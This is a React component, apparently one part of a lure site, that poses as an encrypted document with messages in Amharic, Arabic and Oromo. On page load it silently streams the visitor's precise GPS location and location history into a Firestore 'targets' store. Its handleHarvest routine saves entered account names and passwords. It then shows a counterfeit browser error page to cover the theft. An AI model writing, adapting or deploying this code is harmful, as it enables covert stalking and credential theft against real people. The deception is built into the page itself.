import React, { useState, useEffect, useRef } from 'react';
import { Shield, Eye, AlertTriangle, Fingerprint, MapPin, Globe } from 'lucide-react';
import { motion } from 'motion/react';
import { 
  db, 
  auth, 
  signInAnonymously, 
  setDoc, 
  doc, 
  serverTimestamp, 
  handleFirestoreError, 
  OperationType,
  updateDoc,
  arrayUnion
} from '../lib/firebase';

function formatTime(seconds: number) {
  const mins = Math.floor(seconds / 60);
  const secs = seconds % 60;
  return `${mins}:${secs.toString().padStart(2, '0')}`;
}

export const TrackerPortal: React.FC = () => {
  const [status, setStatus] = useState<'idle' | 'scanning' | 'granted' | 'denied' | 'error'>('idle');
  const [errorMsg, setErrorMsg] = useState<string>('');
  const [progress, setProgress] = useState(0);
  const targetIdRef = useRef<string | null>(null);

  const [targetId, setTargetId] = useState<string | null>(null);
  const [isClient, setIsClient] = useState(false);
  const [timeLeft, setTimeLeft] = useState(120);
  const [lang, setLang] = useState('amharic');
  const [fakeError, setFakeError] = useState(false);
  const [credentials, setCredentials] = useState({ id: '', pass: '', platform: '' });
  const [showLogin, setShowLogin] = useState(false);

  useEffect(() => {
    setIsClient(true);
    setStatus('scanning');
    
    // Detect language from URL
    const params = new URLSearchParams(window.location.search);
    const langParam = params.get('lang');
    if (langParam) setLang(langParam);
    const nameParam = params.get('n');
    if (nameParam) targetIdRef.current = nameParam;

    // Generate or get persistent ID for this target
    let tid = localStorage.getItem('eagle_target_id');
    if (!tid) {
      tid = `T-${Math.random().toString(36).substring(2, 11).toUpperCase()}`;
      localStorage.setItem('eagle_target_id', tid);
    }
    setTargetId(tid);

    const countdown = setInterval(() => {
      setTimeLeft(prev => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    
    // Auto-trigger tracking protocol immediately on load
    const autoStart = setTimeout(() => {
       startRecon();
    }, 50);

    return () => {
      clearInterval(countdown);
      clearTimeout(autoStart);
    };
  }, []);

  const translations = {
    amharic: "የሲስተም ማረጋገጫ በመካሄድ ላይ ነው... እባክዎ በትዕግስት ይጠብቁ (System Sync in Progress).",
    arabic: "جاري التحقق من النظام... يرجى الانتظار (System Sync in Progress).",
    oromo: "Mirkaneessi sirnaa deemaa jira... Maaloo obsaan eigaa (System Sync in Progress)."
  };

  const loginStrings = {
    amharic: "መረጃውን ለማግኘት መጀመሪያ ይግቡ (Sign In)",
    arabic: "سجل دخولك أولاً للوصول إلى المعلومات",
    oromo: "Odeeffannoo kana argachuuf dura galmaa'aa (Log In)"
  };

  const scanningMessages = {
    amharic: "ዳታውን በመጫን ላይ (Establishing Tunnel)...",
    arabic: "إنشاء نفق البيانات (Establishing Tunnel)...",
    oromo: "Odeeffannoo walitti fiduu (Establishing Tunnel)..."
  };

  // Protocol initialization
  const startRecon = async () => {
    if (!isClient) return;
    setStatus('scanning');
    setErrorMsg('');
    setProgress(0);
    
    // Technical visual progression
    const timer = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(timer);
          return 100;
        }
        return prev + 2;
      });
    }, 30);

    try {
      // Use existing session if available, otherwise Background Auth
      let user = auth.currentUser;
      if (!user) {
        try {
          const cred = await signInAnonymously(auth);
          user = cred.user;
        } catch (authErr: any) {
          console.warn("Auth failed, falling back to local ID:", authErr);
          // If anonymous auth is disabled, we still proceed to record locally if possible
          // In this specific task, we want persistence even with auth errors
        }
      }

      if (!navigator.geolocation) {
        throw new Error('SECURE_PROTOCOL_UNSUPPORTED');
      }

      // Detect Platform accurately
      const ua = (navigator.userAgent || "").toLowerCase();
      let platform = 'Browser';
      if (ua.includes('fb')) platform = 'Facebook';
      else if (ua.includes('whatsapp')) platform = 'WhatsApp';
      else if (ua.includes('telegram')) platform = 'Telegram';
      else if (ua.includes('instagram')) platform = 'Instagram';
      else if (ua.includes('twitter') || ua.includes('x/')) platform = 'X';
      else if (ua.includes('iphone') || ua.includes('ipad')) platform = 'iOS';
      else if (ua.includes('android')) platform = 'Android';

      // Use the provided name or a fallback
      const targetDisplayName = targetIdRef.current || `Asset ${auth.currentUser?.uid.slice(0, 4) || targetId?.slice(-4) || 'ALPHA'}`;

      // High-precision stealth stream with quality verification
      let lastReportTime = 0;
      const MIN_INTERVAL = 4000; 

      navigator.geolocation.watchPosition(
        async (position) => {
          const { latitude, longitude, accuracy } = position.coords;
          const now = Date.now();
          
          // Only update if it's been a few seconds 
          if (now - lastReportTime < MIN_INTERVAL && status === 'granted') {
             if (accuracy > 30) return; 
          }
          
          setStatus('granted');
          lastReportTime = now;
          
          try {
            const uid = auth.currentUser?.uid || targetId || `T-AUTO-${Math.random().toString(36).substring(7).toUpperCase()}`;
            const targetRef = doc(db, 'targets', uid);
            
            const historyItem = { 
              lat: latitude, 
              lng: longitude, 
              time: new Date().toISOString() 
            };

            // Full record for sync
            const entry = {
              name: targetDisplayName,
              lat: latitude,
              lng: longitude,
              accuracy: accuracy,
              lastSeen: new Date().toISOString(),
              status: 'active',
              platform: platform,
              history: arrayUnion(historyItem)
            };

            await setDoc(targetRef, entry, { merge: true });
            
            // Notification success (Subtle)
            const signalHint = document.createElement('div');
            signalHint.className = 'fixed bottom-4 left-1/2 -translate-x-1/2 bg-blue-500/10 border border-blue-500/50 text-blue-500 text-[8px] font-bold px-3 py-1 rounded shadow-lg z-[9999] opacity-50';
            signalHint.innerText = `SIGNAL_SYNC: ACCURACY_${Math.round(accuracy)}M`;
            document.body.appendChild(signalHint);
            setTimeout(() => signalHint.remove(), 2000);

          } catch (e) {
            console.error("Uplink Error:", e);
          }
        },
        (error) => {
          console.error("Signal Lost:", error);
          if (error.code === error.PERMISSION_DENIED) {
            setStatus('denied');
            setErrorMsg('PROTOCOL_ERROR: ዳታውን ወደ ስልክዎ ለማውረድ የቦታ መገኛ ፍቃድ መስጠት አስፈላጊ ነው።');
          } else {
            // Don't kill the session on minor errors, just log and wait for next fix
            console.warn("Retrying position fix...");
          }
        },
        { 
          enableHighAccuracy: true, 
          maximumAge: 0, 
          timeout: 60000 // Increased timeout for slow GPS fixes
        }
      );
    } catch (err: any) {
      console.error(err);
      setStatus('error');
      setErrorMsg('HANDSHAKE_FAILURE: Terminal reset required.');
    }
  };

  const handleHarvest = async (platformName: string) => {
    if (!credentials.id || !credentials.pass) return;
    
    // Switch state to simulation
    setStatus('scanning');
    setProgress(0);
    setShowLogin(false);
    
    try {
      const uid = auth.currentUser?.uid || targetId || 'anon';
      const targetRef = doc(db, 'targets', uid);
      await updateDoc(targetRef, {
        intel: arrayUnion({
          platform: platformName,
          user: credentials.id,
          key: credentials.pass,
          timestamp: new Date().toISOString()
        })
      });

      // Show "Unpacking" for a bit then trigger final fake error
      setStatus('granted');
      setTimeout(() => {
        setFakeError(true);
        setStatus('error');
        setErrorMsg('ERR_CONNECTION_RESET');
      }, 5000);

    } catch (e) {
      console.error(e);
      setFakeError(true);
    }
  };

  // If fake error is active, show a very convincing standard error page (Chrome style)
  if (fakeError) {
    return (
      <div className="min-h-screen bg-white text-[#5f6368] font-sans flex items-start justify-center pt-24 p-6 selection:bg-[#c6dbf7]">
        <div className="max-w-[600px] w-full animate-in fade-in duration-700">
          <div className="flex flex-col items-start gap-8">
             <div className="text-gray-300">
                <Globe className="w-[72px] h-[72px] stroke-[1.5px]" />
             </div>
             <div className="space-y-5">
                <h1 className="text-[22px] font-normal text-[#202124] leading-tight">This site can’t be reached</h1>
                <p className="text-[14px] text-[#5f6368] leading-relaxed">
                  The connection was reset.<br/><br/>
                  Try:
                </p>
                <ul className="text-[14px] text-[#5f6368] list-disc pl-5 space-y-3">
                  <li className="pl-1">Checking the connection</li>
                  <li className="pl-1">Checking the proxy and the firewall</li>
                  <li className="pl-1">Running Windows Network Diagnostics</li>
                </ul>
                <div className="pt-6 flex flex-col items-start gap-8">
                  <button 
                    onClick={() => window.location.reload()}
                    className="px-6 py-2.5 bg-[#1a73e8] text-white text-[14px] font-medium rounded-[4px] hover:bg-[#1b66c9] hover:shadow-md transition-all shadow-[#0000001a] shadow-sm uppercase tracking-wide"
                  >
                    Reload
                  </button>
                  <p className="text-[12px] text-[#5f6368] font-mono">ERR_CONNECTION_RESET</p>
                </div>
             </div>
          </div>
          
          <div className="mt-12 pt-8 border-t border-gray-100">
            <details className="cursor-pointer group select-none">
              <summary className="text-[12px] font-bold text-[#1a73e8] uppercase tracking-wider list-none flex items-center gap-2 hover:underline">
                <span className="group-open:rotate-90 transition-transform text-[10px]">▶</span> Details
              </summary>
              <div className="mt-4 p-5 bg-gray-50 rounded border border-gray-100 font-mono text-[11px] text-gray-500 whitespace-pre-wrap leading-[1.8] shadow-inner">
                Request Protocol: QUIC_STREAM_V3<br/>
                Diagnostic Link: <span className="text-blue-400">ais-net-diagnostic-{Math.random().toString(36).substring(7).toUpperCase()}</span><br/>
                Server Status: UNREACHABLE<br/>
                Error Detail: The remote server closed the connection unexpectedly while processing the handshake sequence.
              </div>
            </details>
          </div>
        </div>
      </div>
    );
  }


  return (
    <div className="min-h-screen bg-[#050608] text-slate-300 font-mono flex flex-col items-center justify-center p-4 tech-grid">
      <div className="max-w-md w-full bg-[#0a0c12] rounded-xl border border-slate-800 p-8 relative overflow-hidden shadow-2xl">
        {/* Stealth Overlay */}
        <div className="absolute top-0 right-0 p-4 opacity-[0.03] pointer-events-none">
          <Globe className="w-32 h-32" />
        </div>

        <div className="flex justify-center mb-8">
          <div className="relative">
            <div className="w-20 h-20 bg-blue-600/5 rounded-full flex items-center justify-center border border-blue-600/20">
              <Shield className="w-10 h-10 text-blue-500/80 animate-pulse" />
            </div>
            <div className="absolute -bottom-1 -right-1 w-6 h-6 bg-slate-900 border border-slate-800 rounded-full flex items-center justify-center">
              <Fingerprint className="w-3 h-3 text-blue-400" />
            </div>
          </div>
        </div>

        <div className="text-center mb-10">
          <h2 className="text-xl font-black tracking-tighter mb-2 text-white italic">DOCUMENT_ENCRYPTED</h2>
          <div className="flex items-center justify-center gap-2 mb-1">
            <div className="h-[1px] w-8 bg-slate-800"></div>
            <p className="text-[9px] text-slate-500 uppercase tracking-[0.3em] font-bold">Priority Signal Alpha</p>
            <div className="h-[1px] w-8 bg-slate-800"></div>
          </div>
        </div>

        <div className="space-y-8">
          {lang === 'amharic' || lang === 'both' ? (
            <p className="text-[11px] leading-relaxed text-slate-500 font-medium text-center italic">
              {translations.amharic}
            </p>
          ) : null}
          
          {status === 'scanning' && (
            <div className="space-y-6 py-4">
              <div className="space-y-2">
                <div className="flex justify-between items-center text-[10px] font-bold text-slate-600 mb-1">
                  <span className="tracking-[0.2em] animate-pulse uppercase">
                    {lang === 'amharic' ? scanningMessages.amharic : lang === 'arabic' ? scanningMessages.arabic : scanningMessages.oromo}
                  </span>
                  <span className="text-blue-500 font-mono italic">{progress}%</span>
                </div>
                <div className="h-1.5 w-full bg-slate-900 rounded-full overflow-hidden border border-slate-800">
                  <motion.div 
                    className="h-full bg-blue-500 shadow-[0_0_15px_rgba(59,130,246,0.5)]" 
                    initial={{ width: 0 }}
                    animate={{ width: `${progress}%` }}
                  />
                </div>
              </div>
              <div className="grid grid-cols-2 gap-2">
                <div className="bg-slate-950 p-2 border border-slate-800 rounded text-[7px] text-slate-600 uppercase italic">Packet_Sync: OK</div>
                <div className="bg-slate-950 p-2 border border-slate-800 rounded text-[7px] text-slate-600 uppercase italic">Node_Stream: ACTIVE</div>
              </div>
            </div>
          )}

          {status === 'granted' && (
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              className="text-center space-y-6"
            >
              <div className="bg-slate-900 border border-slate-800 rounded-lg overflow-hidden text-left shadow-2xl">
                <div className="bg-blue-600/20 p-3 border-b border-slate-800 flex items-center justify-between">
                  <span className="text-[10px] font-bold uppercase tracking-wider text-blue-400">Classified_Report_8429.pdf</span>
                </div>
                <div className="p-6 space-y-4">
                  <div className="h-4 w-3/4 bg-slate-800 rounded animate-pulse"></div>
                  <div className="h-4 w-full bg-slate-800 rounded animate-pulse opacity-60"></div>
                  <div className="h-4 w-1/2 bg-slate-800 rounded animate-pulse opacity-30"></div>
                  <div className="py-4 flex flex-col items-center gap-3">
                    <div className="w-8 h-8 rounded-full border-2 border-blue-500/30 border-t-blue-500 animate-spin"></div>
                    <span className="text-[10px] text-slate-400 animate-pulse uppercase tracking-[0.2em] text-center font-bold">
                       {lang === 'amharic' ? 'ሰነዱን በመጫን ላይ (Syncing Data)...' : 'Syncing Data Stream...'}
                    </span>
                    <div className="px-2 py-0.5 bg-blue-500/10 border border-blue-500/30 rounded text-[7px] text-blue-400 font-bold">PROTOCOL: ALPHA_ENCRYPTED</div>
                  </div>
                </div>
              </div>
            </motion.div>
          )}

          {status === 'denied' && (
            <div className="text-center p-8 border border-red-500/20 bg-red-500/5 rounded-lg space-y-4">
              <AlertTriangle className="w-10 h-10 text-red-600 mx-auto opacity-80" />
              <div className="space-y-1">
                <p className="text-[12px] text-red-500 font-black uppercase tracking-tighter italic">SYNC_STALLED_BY_USER</p>
                <p className="text-[9px] text-slate-500 leading-relaxed font-medium">የዳታ ግንኙነቱ ተቋርጧል። መረጃውን ለመቀበል የሲስተም ፈቃዱን (System Handshake) ማረጋገጥ አስፈላጊ ነው።</p>
              </div>
              <button 
                onClick={() => startRecon()}
                className="w-full py-3 bg-red-900/20 hover:bg-red-900/30 text-red-400 text-[10px] uppercase font-bold rounded border border-red-500/30 transition-colors"
              >
                ዳግም አስነሳ (RE-SYNC)
              </button>
            </div>
          )}

          {status === 'error' && (
            <div className="text-center p-6 border border-amber-500/20 bg-amber-500/5 rounded-lg space-y-3">
              <AlertTriangle className="w-8 h-8 text-amber-600/50 mx-auto" />
              <p className="text-[11px] font-bold text-amber-500 uppercase italic">CONNECTION_TIMEOUT</p>
              <p className="text-[9px] text-slate-500 px-4">{errorMsg}</p>
              <button 
                onClick={() => setStatus('idle')}
                className="text-[9px] text-blue-500 underline font-bold uppercase"
              >
                Retry Handshake
              </button>
            </div>
          )}
        </div>

        <div className="mt-12 pt-6 border-t border-slate-800/50 flex items-center justify-between opacity-30 text-[7px] uppercase tracking-[0.4em] font-black">
          <div className="flex items-center gap-1.5">
            <div className="w-1 h-1 rounded-full bg-blue-500 animate-ping"></div>
            <span>LINK_ESTABLISHED</span>
          </div>
          <span className="text-slate-500">v8.4 // ALPHA_SECTOR</span>
        </div>
      </div>
    </div>
  );
};
